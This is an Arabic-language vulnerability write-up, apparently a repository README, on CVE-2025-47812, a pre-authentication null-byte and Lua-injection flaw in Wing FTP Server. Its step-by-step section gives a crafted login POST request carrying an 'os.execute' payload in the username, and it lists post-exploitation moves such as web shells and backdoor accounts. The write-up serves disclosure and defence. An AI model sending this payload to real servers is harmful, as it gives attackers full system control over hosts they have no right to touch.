# CVE-2025-47812 — ثغرة Wing FTP Server: إدخال بايت فارغ وحقن Lua (تنفيذ أوامر عن بُعد)

### نظرة عامة
- **معرّف CVE:** CVE-2025-47812  
- **تاريخ النشر:** 30 يونيو 2025  
- **الخطورة (CVSS):** 9.8 (حرجة)  
- **البرامج/الإصدارات المتأثرة:** Wing FTP Server (جميع المنصات، الإصدارات **قبل 7.4.4**)  
- **نوع الثغرة:** إدخال بايت فارغ + حقن Lua يؤدي إلى تنفيذ أوامر عن بُعد (RCE)

**ملخص:**  
وجود خلل في طريقة معالجة Wing FTP Server لأحرف **البايت الفارغ (`%00`) في اسم المستخدم** أثناء عملية المصادقة يسمح للمهاجمين بحقن **كود Lua** عشوائي. هذا يمكن أن يُمكّن **المهاجم غير المصادق** من تنفيذ أوامر نظام التشغيل بصلاحيات **SYSTEM (ويندوز)** أو **root (لينكس/يونكس)**.

نظرًا لأن الثغرة **تُستغل قبل المصادقة وبسهولة كبيرة**، فهي تُصنف على أنها **حرجة (RCE)** وقد لوحظ استخدامها في **هجمات حقيقية نشطة**.

---

### السياق
لفهم التأثير، من المهم معرفة **كيف يتعامل Wing FTP مع المصادقة** ولماذا تعتبر هذه الثغرة خطيرة:

- **Wing FTP Server** هو حل شائع لإدارة نقل الملفات عبر منصات متعددة.  
- أثناء المصادقة، يتم **تحليل أسماء المستخدمين وتخزينها** في ملفات جلسة مؤقتة.  
- الخادم يعالج بشكل غير صحيح **أحرف البايت الفارغ (`%00`) داخل أسماء المستخدمين**.  
- **المشكلة:** يمكن للمهاجم إلحاق **كود Lua بعد البايت الفارغ**، والذي يتم تمريره إلى مفسر Lua المدمج في Wing FTP.  
- **النتيجة:** تنفيذ الكود المحقون على الخادم بصلاحيات كاملة.

---

### السبب الجذري
تنشأ الثغرة بسبب **معالجة غير آمنة للمدخلات**:

- روتين المصادقة **لا يقوم بتطهير أحرف البايت الفارغ بشكل صحيح**.  
- بعد القطع عند البايت الفارغ، **يتم تحليل بقية الحمولة التي يسيطر عليها المهاجم**.  
- بما أن Wing FTP يستخدم **Lua للتشغيل الداخلي**، يتم تفسير الحمولة الضارة ككود Lua.  
- **التركيبة:** بايت فارغ + تفسير Lua = تنفيذ أوامر عن بُعد.

---

### استغلال الثغرة (خطوة بخطوة)

#### 1. تحديد نقطة تسجيل الدخول
يتصل المهاجم بصفحة تسجيل الدخول في Wing FTP أو نقطة النهاية الخاصة بها (عادة على المنفذ 5466 للوحة الإدارة):
```
https://victim-ftp.local:5466/admin_login.html
```

#### 2. تجهيز الحمولة الضارة
يقوم المهاجم بإدخال اسم مستخدم يحتوي على بايت فارغ متبوع بكود Lua.  
مثال تعليمي:
```
اسم المستخدم: validuser%00; os.execute("whoami")
كلمة المرور: أي شيء
```

#### 3. إرسال الطلب
طلب POST مصمم قد يبدو هكذا:
```http
POST /admin_login.html HTTP/1.1
Host: victim-ftp.local:5466
Content-Type: application/x-www-form-urlencoded

username=admin%00;os.execute('whoami')&password=test
```

#### 4. ملاحظة التنفيذ
البايت الفارغ يقص التحليل الطبيعي، لكن كود `os.execute()` في Lua يُنفذ داخل الخادم.  
المخرجات النموذجية قد تظهر:
```
nt authority\system
```
على ويندوز، أو
```
root
```
على لينكس.

هذا يؤكد **تنفيذ أوامر عن بُعد** بصلاحيات النظام العليا.

---

### ما بعد الاستغلال
بمجرد الوصول إلى تنفيذ الأوامر، يمكن للمهاجم:

* نشر **أصداف ويب** أو **قنوات عكسية** للبقاء مستمرًا.  
* إنشاء أو تعديل حسابات FTP للوصول الخلفي.  
* استخراج الملفات الحساسة مباشرة من مستودع FTP.  
* التحرك جانبياً داخل بيئة المؤسسة.

تم الإبلاغ عن **هجمات حقيقية** باستخدام هذه الثغرة لنشر backdoors مبنية على Lua.  
كما أصدر Rapid7 **وحدة Metasploit** للاختبار الأمني:  
`exploit/multi/http/wingftp_null_byte_rce`

---

### إثبات المفهوم

تم نشر **PoC تعليمي** بواسطة الباحث الأمني **Julien Ahrens** وتم تكييفه لاحقًا من قبل Huntress Labs. [`poc/exploit.py`](poc/exploit.py)  
يوضح PoC:  
- حقن بايت فارغ في حقل اسم المستخدم.  
- تنفيذ أوامر Lua يتحكم بها المهاجم.  
- تأكيد تنفيذ أوامر عشوائية (مثل `whoami`).  

⚠️ يجب استخدام PoC فقط في بيئات اختبارية أو مختبرية آمنة.
https://github.com/0xcan1337/CVE-2025-47812-poC/
---

### الدروس المستفادة

1. **حقن البايت الفارغ لا يزال موجودًا.** الحيل القديمة مثل `%00` يمكن أن تكسر الأكواد الحديثة إذا لم تُعالج بشكل آمن.  
2. **المفسرات المدمجة خطيرة.** السماح لمدخلات المستخدم بالوصول إلى محركات Lua، Python، أو JavaScript يشكل خطرًا.  
3. **RCE قبل المصادقة = أقصى درجة خطورة.** الأخطاء قبل المصادقة تعرّض النظام للإنترنت بلا حماية.  
4. **التحديث السريع ضروري.** تم استغلال الثغرة في الأيام الأولى بعد الإعلان عنها.  
5. **الطبقات الدفاعية مهمة.** لا يجب كشف لوحات الإدارة مباشرة للإنترنت دون حماية على مستوى الشبكة.

---

### المراجع

* [مدونة Huntress — استغلال Wing FTP Server في العالم الحقيقي (CVE-2025-47812)](https://www.huntress.com/blog/wing-ftp-server-remote-code-execution-cve-2025-47812-exploited-in-wild)  
* [HelpNetSecurity — ثغرة حرجة في Wing FTP مستغلة (CVE-2025-47812)](https://www.helpnetsecurity.com/2025/07/11/critical-wing-ftp-server-vulnerability-exploited-in-the-wild/)  
* [مدونة SecPod — استغلال فعال لـ CVE-2025-47812](https://www.secpod.com/blog/wing-ftp-under-siege-critical-vulnerability-actively-exploited/)  
* [وحدة Metasploit: exploit/multi/http/wingftp_null_byte_rce](https://www.rapid7.com/db/modules/exploit/multi/http/wingftp_null_byte_rce/)  
* [إشعار البائع — ملاحظات إصدار Wing FTP Server v7.4.4](https://www.wftpserver.com/serverhistory.htm)  
* [سجل CVE — CVE-2025-47812 (MITRE)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-47812)  
* [سجل NVD — CVE-2025-47812](https://nvd.nist.gov/vuln/detail/CVE-2025-47812)

